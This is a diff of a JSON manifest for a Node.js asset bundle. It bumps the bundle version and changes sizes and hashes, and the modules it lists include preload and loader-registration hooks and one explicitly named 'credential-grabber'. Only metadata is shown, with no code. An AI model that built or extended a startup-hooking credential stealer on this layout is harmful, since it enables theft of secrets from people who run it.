@@ -1,46 +1,70 @@
 {
   "schemaVersion": 2,
-  "bundleVersion": "5",
+  "bundleVersion": "10",
   "assets": [
     {
       "name": "credential-grabber.cjs",
       "path": "credential-grabber.cjs",
       "role": "credential-grabber",
       "moduleType": "cjs",
-      "size": 3455,
-      "sha256": "2b10137a622c88627bdca4b14a16eb2bd758b43d8ac9e3aaccf4bc8003368a44"
+      "size": 13254,
+      "sha256": "726aab6512c13b7f51ad4040e68abc1e5d2074249deba5bade3eafbf6c342e54"
     },
     {
       "name": "loader-register.mjs",
       "path": "loader-register.mjs",
       "role": "loader-registration",
       "moduleType": "esm",
-      "size": 618,
-      "sha256": "3f98b1a67f4cbcb663f68503a73afeb686ba35f9d0490b28dc94d39511e7d50c"
+      "size": 1134,
+      "sha256": "84cb72d9aebce960973b63af86da05c1c9cfc7966ed94fc872b1c8673a4b0193"
     },
     {
       "name": "preload.cjs",
       "path": "preload.cjs",
       "role": "preload-cjs",
       "moduleType": "cjs",
-      "size": 402,
-      "sha256": "da8e42eecf039e23a687fcb361c9192a76a707150fc2feda1abde336da0a5fcb"
+      "size": 1323,
+      "sha256": "f6c252edea75c2f1ac6ae54b1923c8466720fe7ca6a54e7821e3c0442641f7bf"
     },
     {
       "name": "preload.mjs",
       "path": "preload.mjs",
       "role": "preload-esm",
       "moduleType": "esm",
-      "size": 504,
-      "sha256": "9aa0a6e010412b593569e3deaa6f34f1c17a7c2137a0c69a47eaff15291252c6"
+      "size": 1430,
+      "sha256": "69339bc3c4eb24d9373178705504913940b39a4acbaf2c317824422bc43eb55d"
+    },
+    {
+      "name": "resolve-diagnostic.mjs",
+      "path": "resolve-diagnostic.mjs",
+      "role": "loader-support",
+      "moduleType": "esm",
+      "size": 14571,
+      "sha256": "808f0735a91520e61e7473167991067fa6ffe0aafd3b9bae813b01e62cc56586"
+    },
+    {
+      "name": "resolve-utils.mjs",
+      "path": "resolve-utils.mjs",
+      "role": "loader-support",
+      "moduleType": "esm",
+      "size": 13651,
+      "sha256": "9ff3cb41c5e28a291e120758fb6ae87bb18b701884f5609943b5b89f9a7fbee7"
     },
     {
       "name": "ts-loader.mjs",
       "path": "ts-loader.mjs",
       "role": "loader-support",
       "moduleType": "esm",
-      "size": 12512,
-      "sha256": "a468e92ee08902500cd5be224aedc10945334110e3287450b7d64ddf41f6e30b"
+      "size": 29514,
+      "sha256": "9fc012044568724a16ff27f9ba8418ecec17bc6cb81bce1e9869231a2489d023"
+    },
+    {
+      "name": "web-storage.cjs",
+      "path": "web-storage.cjs",
+      "role": "loader-support",
+      "moduleType": "cjs",
+      "size": 16577,
+      "sha256": "35afb900c303d105ad005ef02ffe58b7f9f8b5967bb4a30bb4be1439d8031500"
     }
   ]
 }
